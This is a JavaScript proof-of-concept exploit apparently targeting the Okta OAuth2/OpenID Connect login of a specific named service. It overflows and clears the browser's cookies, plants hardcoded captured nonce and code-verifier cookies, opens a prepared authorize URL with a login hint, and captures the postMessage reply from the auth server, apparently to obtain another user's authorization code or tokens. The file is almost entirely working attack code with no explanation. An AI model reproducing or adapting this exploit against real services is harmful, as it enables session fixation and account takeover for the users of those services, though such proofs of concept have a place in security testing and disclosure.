// PUT HERE YOUR VARS

var loginurl="https://auth.externalbeta2.emaplan.com/oauth2/default/v1/authorize?client_id=0oaedsgzjxZlGjbOX4h7&redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema%2Fauthorization-code%2Fcallback&response_type=code&scope=openid%20profile&code_challenge=qRka53QW66jU8cyG0J6Fs_MtSKkK04NJhdI40NQ70lA&code_challenge_method=S256&state=OpenIdConnect.AuthenticationProperties%3DD6EOd193ElYYMsK7PmuNARAy1QFenfjE3ZNf7Q_c1Xo2hW2LTfJ01uyKi5FJtv6FIrmyVoOI1mxEXDhvPKzuq6EYQVz4UBiyM3R1pA9l1xpitaHby8Tj7iqe8_ZbpPXOhpQcGvMZA0Ik1XA1wK0JZJFlRdgaZmF9XLZjGaaost4TOY85FTh92rKQx3au73SpYg15TszAFABF0xWmc9KXX7nZwPXxoMkz-fzcdLC-5waQ8x4eMEoiNfhY--Vfx4kD3eO67ASLyzSrh_gIOU4QomjmdnjFpjzzCzV9REoCvyuWDDZYG4rcf-LQLqc3M-xNnhmSc9iuEXJs5BySyo9T0ngyZibEzPpRAI5HvzoXg_8cbLehkm3BlL31kLMcvd8m93QPvqB_8O0cdXeQOW4qhLNCVBttWVEsBYwDY1zcLCOBw-QRnxzwdWi5EAcaiIMkmmzIlw4sbXWWRzC6YY9tIYP6RU-04pRFXx2SwdVV_yiGX20ii3l65kMvQJtP_HBrugxjhzTYVBb_J8WuYvU8SR_PUop0jF3KtK56BTARaEEf5fjTsb_eVaS-KLKM_-zTzZduTx1sprRpPTx-8BZCyl-UFgLMZWCbBX9RmEQsuLvZNx1o7klPqzPWIoy1TJUyPh-diP5u0sfPn835US9CKSJwsSsn8p4t5jB5sbB8HKrFvNyXJtkuIyk-Vj_UysQteqGz6VfJK4Uto7AEH_IaeibsZ_ILW6jqLZoV-kvDYw1gO_1Z3PYHtoUvyUSXmDwHEZt726Q2XLJeqtieo5kbXWLY_9AqdVMiziz76Fes9wSfixhrAE8sCtnnh3Q-v1aAD2f_L4y-BRb6yRkPGTSYf2pcMwK-ksqVqgl43LwDLU4hh9We0et9yNCsyJ8YK29YUIAqafJB4MWo7lwGnk-ZOj67EWXpjZpor9pEnloCvipteD9DeJK_Z__uhQ_vqDwPYLSH_4Dgp9jIZq2ALuD3ee8ZazLHIiOt6KwmclgOdaZD6QjESKkaVmJzs2RwYUTDcM48tZyvrbx5eHfqMwSCndaywYFBJMt706T5N3tljYrIQOTwoNshay000RAQecnQpiNg9kxYFJ3tauVHOaO0BebApM-bpn88ApnW0OxWm1EcB8_2hPvQjp3bSJ5uHH1L7DSV4U0uHO0Ajgyxc-HxtHw8EfQ1iDBhnAsx4tTHkAOEcfxTHL5M007WXBMYt7C2cre02KJ2rI7Na-7cKn3z65Gko6jJw_K9GJd6Ja0pGpqZjRJ4EqE7x5L-d1dN7g3TJamieKPX6svar11BV7CBgf-B2Qi4m5fDmxJSRu7weTEGjDmuMUO92sFuM-yP46jsfGhasYRcMUqZ1RuBBjDX0jVuH_A4BKsKj9rC81xKH29uNcmk_XvIM8MkcdqJ9mRpMxpp_B9pJ6F6Bw04qTS811MkB1KJs7Fat47HKgPCklMYqX5ivHgvXmp2ewiEh_rjWwm_5X19ZBoat-D4Z3pCTsrSI9TgGwAM_U6Ua3UKLymVSiCu7C3GpYxv3P-_zSnRMAAi4QblX0WoY7vHRVJHE3sG5Qcb63ooMPnrkqrg6zHt2_ZpN2T6X9NEi3h3nX6aNyv9K-2kPBv1KGzUFTPSpAhjY6XaGHydhMuW7gbbh_gFsfNInV89oi5nK4GpG5yg3AIn71dZ2R8lxaNwTRD85NT6wEg3xp_e41Pmcj7u12D3UxtUVhdXmfBNBiIX6gC7ZKFv2dqtC_OG7cLDpZFbgeOfFVv9ayHbuS04lLauE-kldGj6sPjAZtqOtCpfL-yyCTzZsdQFFl-aGKulDvB9F5943OKqySLu-_yeSUE8iX8cqmHdWJ85NVh7LfbZ9MlybhUTpTtsM32Zkh6bvr4JWi4i_2uGlVtxhTPXDch67l7pXx29i6P75GJEmPbkjyypkVBEanZk3JYmLg8bDqvC6nKIi2rKWGyqq6x9HSMvxndPRzoPO1IQSg8GO-aIYN9KAdd4iLvcfwWC0YLPPobSgUtYpL3yBmmC7_V4qDUfYMwy1Yc4IVc51mea7OcIzZBS5fKWEs9q-ZR60ugPTCQEMA&response_mode=okta_post_message&nonce=638766322247218487.MDc5MDc3NDUtYzY0ZC00ODliLTk2YTItNmY2NzMzMWJkYTIx&login_hint=H1Client00422&partner=ema&office=ema&logo=partner%2Fdefault%2FFiles%2FImages%2FHeader%2FTopLeftLogo.gif%3Fv%3D1039623088&enable_spi_sso=False&post_logout_redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema&x-client-SKU=ID_NET472&x-client-ver=8.3.0.0";
var openidnonce="OpenIdConnect.nonce.47/BHHinrqMQVORfvKqj1B+qLcqYP4AmJZ0mygEF6Hw==WEp1Qm9YOTdwV3dCOG0yanMxV2Jtd01vSjRqRTJwYnZsT1BXMTZfaDVkd3Zic1pNd3hDSmJIODA4cHNGeHFxUHo1LXR2bDNqVnRkWEloVU9pbXQ5c3hwbDZpVUIxTDRqX2FRcXU4Zm42UGFtWWJXaUFFT3cwcVZNT0FuamdfMXVXbVFYSXlVUUlUUVM1dzVhWnM4X3ZNX093RHpfNHNENkp4cEloWTFXSlRROXZObnpkVTBVU2JzY01lV2xGb1h0MzRjN1NEdDdPS0RGSmdrT1ZqT243U2dCRy0xbzZFYTlvc1JNQnJfMnRBVQ==";
var openIdcv="OpenIdConnect.cv.mOdZir4fH6oJ7rovwtoBHA1Mg1PtIXZ%2f4uUf4Fj4pKc%3d=MVlhdUhDaElIMlozRFZ5cXZQRmRDOXI5anp5ekVBQUhlTHd3Q2xReEVXMEZxSkhOSnQ2QjZxYVZlcVBOYzg1cTl1SUZFQk0ycEhjSkF5Y3hOR3dJMy11TnppOEROcTdjcDRkekVmV05zMmFjZlNPSTMxYk5CV05IRkQyZEZySFEzaHdKOVF1UjNtRHF3SkhXMTNLbmtn";

function deleteAllCookies() {
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}; Secure`;
    }

    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
}

function executePoC(){
    var x = window.open(loginurl);
    window.addEventListener('message',(e)=>{
        if (e.origin === "https://auth.externalbeta2.emaplan.com"){
            alert(JSON.stringify(e.data));
        }        
    });
}

function setCookies(){
    document.cookie=`${openidnonce}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`
    document.cookie=`${openIdcv}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`;
}

deleteAllCookies();
setCookies();
executePoC();
